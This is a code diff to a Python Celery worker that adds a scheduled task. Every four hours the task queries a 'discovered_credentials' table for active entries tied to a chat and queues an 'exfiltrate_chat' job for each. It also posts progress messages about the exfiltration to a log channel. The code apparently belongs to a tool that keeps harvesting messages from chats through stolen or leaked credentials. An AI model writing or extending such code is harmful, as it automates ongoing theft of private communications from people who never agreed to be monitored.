@@ -345,3 +345,56 @@ def system_heartbeat():
     msg = "💓 **System Heartbeat**: Worker is active and scanning."
     loop.run_until_complete(broadcaster_service.send_log(msg))
     return "Heartbeat sent."
+
+@app.task(name="flow.rescrape_active")
+def rescrape_active():
+    """
+    Periodic task to re-scrape all active credentials for new messages.
+    Runs every 4 hours to catch new activity in monitored chats.
+    """
+    loop = asyncio.get_event_loop()
+    if loop.is_closed():
+        loop = asyncio.new_event_loop()
+        asyncio.set_event_loop(loop)
+    return loop.run_until_complete(_rescrape_active_logic())
+
+async def _rescrape_active_logic():
+    """
+    Query all active credentials with a chat_id and trigger exfiltration.
+    """
+    await broadcaster_service.send_log("🔄 **Re-scrape**: Starting periodic scrape of active credentials...")
+    
+    try:
+        # Get all active credentials that have a chat_id (ready to scrape)
+        response = db.table("discovered_credentials")\
+            .select("id")\
+            .eq("status", "active")\
+            .not_.is_("chat_id", "null")\
+            .execute()
+        
+        credentials = response.data or []
+        
+        if not credentials:
+            await broadcaster_service.send_log("ℹ️ **Re-scrape**: No active credentials to scrape.")
+            return "No active credentials found."
+        
+        await broadcaster_service.send_log(f"📋 **Re-scrape**: Found {len(credentials)} active credentials. Queuing exfiltration...")
+        
+        queued = 0
+        for cred in credentials:
+            cred_id = cred["id"]
+            try:
+                # Queue exfiltration task (don't block, let Celery handle concurrency)
+                exfiltrate_chat.delay(cred_id)
+                queued += 1
+            except Exception as e:
+                print(f"Failed to queue exfiltration for {cred_id}: {e}")
+        
+        msg = f"🏁 **Re-scrape**: Queued {queued}/{len(credentials)} credentials for exfiltration."
+        await broadcaster_service.send_log(msg)
+        return msg
+        
+    except Exception as e:
+        error_msg = f"❌ **Re-scrape** failed: {e}"
+        await broadcaster_service.send_log(error_msg)
+        return error_msg
